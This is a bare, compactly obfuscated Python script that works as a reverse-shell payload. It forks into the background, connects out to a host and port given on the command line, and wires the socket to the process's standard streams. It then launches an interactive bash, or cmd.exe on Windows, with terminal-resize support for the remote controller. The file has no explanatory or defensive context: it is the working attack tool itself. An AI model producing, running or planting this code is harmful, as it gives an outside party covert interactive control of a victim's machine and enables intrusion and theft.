import os,socket as S,fcntl,struct as T,sys as y,pty

u=T.unpack
k=os.fork
b=b""
p=pty.spawn
e=y.exit
a=y.argv

def r(fd):
	global b
	b+=os.read(fd,1024)
	r=b""
	while len(b)>=4:
		o,=u("!B",b[:1])
		if o==0:
			l,=u("!H",b[1:3])
			if len(b)<3+l:
				break
			r+=b[3:3+l]
			b=b[3+l:]
		else:
			w,h=u("!HH",b[1:5])
			b=b[5:]
			s=T.pack("HHHH",h,w,0,0)
			fcntl.ioctl(3,21524,s) #termios.TIOCSWINSZ
	return r or type("",(bytes,),{"__bool__":lambda _:True})()

if k()or k():e()
with S.socket(S.AF_INET,S.SOCK_STREAM) as s:
	if s.connect((a[1],int(a[2]))):e()
	s.setblocking(False)
	[os.dup2(s.fileno(),i)for i in(0,1,2)]
if y.platform[0]=="w":p(["cmd.exe"],stdin_read=r)
else:p(["/bin/bash","-i"],stdin_read=r)